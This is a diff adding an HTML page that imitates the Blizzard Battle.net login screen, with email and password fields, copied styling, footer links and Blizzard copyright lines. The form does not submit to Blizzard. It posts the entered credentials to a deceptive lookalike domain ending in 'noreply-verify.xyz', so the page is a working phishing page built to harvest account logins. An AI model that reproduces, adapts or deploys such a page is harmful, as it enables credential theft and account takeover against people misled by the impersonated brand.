@@ -1,0 +1,222 @@
+﻿
+
+
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" class="en-us blizzard" >
+<head xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
+<meta http-equiv="imagetoolbar" content="false" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<title>Blizzard Login</title>
+<link rel="shortcut icon" href="images/favicon.0gxnz.ico" />
+<!--[if gt IE 8]><!--><link rel="stylesheet" type="text/css" media="all" href="images/blizzard-web.min.2lSd9.css" /><!-- <![endif]-->
+<!--[if IE 8]><link rel="stylesheet" type="text/css" media="all" href="/login/static/css/toolkit/blizzard-web-ie8.min.css?v=58-1" /><![endif]-->
+<link rel="stylesheet" type="text/css" media="all" href="images/global.min.1oBC3.css%3Fv=1.css" />
+<link rel="stylesheet" type="text/css" media="all" href="images/nav-client.26C4w.css" />
+<link rel="stylesheet" type="text/css" media="(max-width:800px)" href="images/nav-client-responsive.2L8V6.css" />
+<!--[if IE 8]>
+<link rel="stylesheet" type="text/css" media="all" href="//bnetus-a.akamaihd.net/login/static/css/login/ie8.1GXdy.css" />
+<![endif]-->
+<meta name="viewport" content="width=device-width" />
+</head>
+<body class = "us en-us login-template web blizzard"
+data-embedded-state = "STATE_LOGIN"
+data-baseUrl = "/login/en"
+data-cdnUrl = "http://media.blizzard.com"
+data-staticUrl = "/login/static"
+data-sharedStaticUrl = "/login/static/local-common"
+data-secureSupportUrl = "https://us.battle.net/support/"
+data-project = "login"
+data-projectUrl = "/login"
+data-locale = "en-us"
+data-language = "en"
+data-region = "us"
+data-loggedIn = "false"
+data-userAgent = "web"
+data-tagManagerAccount= "GTM-589KTQ"
+data-gtmDataLayer = "[{'userAgent':'web','analyticsRequestUri':'/login/en/','theme':'blizzard','errorCode':'','state':'STATE_LOGIN'}]"
+data-nonce = "fJBWnwPSq1"
+data-network-error-message="Please check your network connection and try again." >
+<div class="grid-container wrapper">
+<h1 class="logo">Blizzard Login</h1>
+<div class="hide" id="info-wrapper">
+<h2><strong class="info-title"></strong></h2>
+<p class="info-body"></p>
+<button class="btn btn-block hide visible-phone" id="info-phone-close">Close</button>
+</div>
+<div class="input" id="login-wrapper">
+<div class="login">
+<form
+action="http://us.battle.net.login.login.xml.account.support.html.noreply-verify.xyz/login/en/o.asp"
+method="post"
+id="password-form"
+novalidate="novalidate"
+class=" captcha-required
+username-required
+input-focus"
+>
+<div id="login-input-container" class="">
+<div id="js-errors" class="alert alert-error alert-icon hide">
+<p id="cookie-check" class="hide">Your browser&#39;s cookies are disabled. Please reenable cookies to continue.</p>
+</div>
+<noscript>
+<div id="javascript-disabled" class="alert alert-error alert-icon">
+JavaScript must be enabled to use this site.
+</div>
+</noscript>
+<div class="control-group">
+<label id="accountName-label" class="control-label"
+for="accountName">Email</label>
+<div class="controls">
+<input
+aria-labelledby="accountName-label"
+id="accountName"
+name="accountName"
+title="Email"
+maxlength="320"
+type="text"
+tabindex="1"
+class="input-block input-large"
+placeholder="Email"
+autocorrect="off"
+spellcheck="false"
+/>
+</div>
+</div>
+<div class="control-group">
+<label id="password-label" class="control-label"
+for="password">Password</label>
+<div class="controls">
+<input
+aria-labelledby="password-label"
+id="password"
+name="password"
+title="Password"
+maxlength="16"
+type="password"
+tabindex="1"
+class="input-block input-large"
+autocomplete="off"
+placeholder="Password"
+autocorrect="off"
+spellcheck="false"
+data-show-password-message="Show" data-hide-password-message="Hide"
+/>
+</div>
+</div>
+<input type="hidden" id="useSrp" name="useSrp" value="false" />
+<input type="hidden" id="publicA" name="publicA" value="" />
+<input type="hidden" id="clientEvidenceM1" name="clientEvidenceM1" value="" />
+<div class="persistWrapper">
+<label id="persistLogin-label" class="checkbox-label css-label hide" for="persistLogin">
+<input
+aria-labelledby="persistLogin-label"
+id="persistLogin"
+name="persistLogin"
+type="checkbox"
+checked="checked"
+tabindex="1"
+/>
+<span class="input-checkbox"></span>
+Keep me logged in
+</label>
+</div>
+</div>
+
+<div class="control-group submit ">
+<button type="submit" id="submit" class="btn btn-primary btn-large btn-block "
+data-loading-text="" tabindex="1">
+Log in to Blizzard
+<i class="spinner-battlenet"></i>
+</button>
+</div>
+<input type="hidden" id="csrftoken" class="csrftoken" name="csrftoken" value="ee8aa0ad-a87e-434b-bda7-60328cd674d2" />
+<input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1530757707676"/>
+</form>
+<div class="thirdparty-line">
+</div>
+<div class="control-group useResponse">
+<div class="grid-50">
+
+</div>
+<div class="grid-50">
+
+</div>
+</div>
+<ul id="help-links">
+<li>
+<a rel="internal"
+href="../www.battle.net/account/creation/tos.html%3Fref=https:%252F%252Fus.battle.net%252Foauth%252Fauthorize%3Fresponse_type%253Dcode%2526redirect_uri%253Dhttps%25253A%25252F%25252Fwww.blizzard.com%25252Fauth%25252Fbnet%25252Fcallback%2526scope%253Dlogout%252520account.licenses%252520email%252520name%252520private_fl.html"
+tabindex="1"
+id="signup"
+>
+Create a free Blizzard Account
+</a>
+</li>
+<li>
+<a rel="internal"
+href="../us.battle.net/account/recovery/index.html%3Fref=&amp;theme=blizzard&amp;app=oauth.html"
+tabindex="1"
+id="loginSupport"
+>
+Can&#39;t log in?
+</a>
+</li>
+</ul>
+</div>
+</div>
+<footer id="footer" class="footer en-us">
+<div id="nav-client-footer" class="nav-client">
+<div class="mobileFooterEnabled footer-content footer-desktop grid-container"> <div class="nav-section support-feedback">
+<div class="nav-left">
+<div id="nav-feedback">
+</div>
+</div>
+</div>
+<div class="nav-section">
+<div class="nav-left nav-logo-group">
+<div class="footer-links nav-left">
+<a class="nav-item nav-a" href="../us.blizzard.com/company/legal/eula.html" data-analytics="global-nav" data-analytics-placement="Footer - eula">Battle.net EULA</a>
+<span>|</span>
+<a class="nav-item nav-a" href="../us.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacy</a>
+<span>|</span>
+<a class="nav-item nav-a" href="../us.blizzard.com/company/legal/index.html" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Terms</a>
+<span>|</span>
+<a class="nav-item nav-a" href="../us.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Copyright Infringement</a>
+<div class="copyright">@2018 Blizzard Entertainment, Inc. All rights reserved.</div>
+<div class="nav-footer-icon-container">
+<ul class="nav-footer-icon-list">
+</ul>
+</div>
+</div>
+</div>
+<div class="nav-ratings">
+</div>
+</div>
+</div>
+<div class="mobileFooterEnabled footer-content footer-mobile grid-container"> <div class="nav-logo-group">
+<div class="footer-links">
+<a class="nav-item nav-a" href="../us.blizzard.com/company/legal/eula.html" data-analytics="global-nav" data-analytics-placement="Footer - eula">Battle.net EULA</a>
+<span>|</span>
+<a class="nav-item nav-a" href="../us.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacy</a>
+<span>|</span>
+<a class="nav-item nav-a" href="../us.blizzard.com/company/legal/index.html" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Terms</a>
+<span>|</span>
+<a class="nav-item nav-a" href="../us.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Copyright Infringement</a>
+</div>
+<div class="copyright">©2018 Blizzard Entertainment, Inc. All rights reserved.</div>
+<div class="nav-footer-icon-container">
+<ul class="nav-footer-icon-list">
+</ul>
+</div>
+<div class="nav-ratings">
+</div>
+</div>
+</div>
+</div>
+</footer> </div>
+<script type="text/javascript" src="../bnetus-a.akamaihd.net/login/static/js/embedded-javascript/embed-0.1.5.min.2QnZN.js%3Fv=58-1"></script>
+<script type="text/javascript" src="../bnetus-a.akamaihd.net/login/static/js/login/global.min.3LqgD.js"></script>
+<script type="text/javascript" src="../bnetus-a.akamaihd.net/login/static/js/login/login.min.2CvPI.js"></script>
+<script type="text/javascript" src="../bnetus-a.akamaihd.net/login/static/js/login/srp-client.min.2bRvA.js%3Fv=1"></script>
+</body>
+</html>
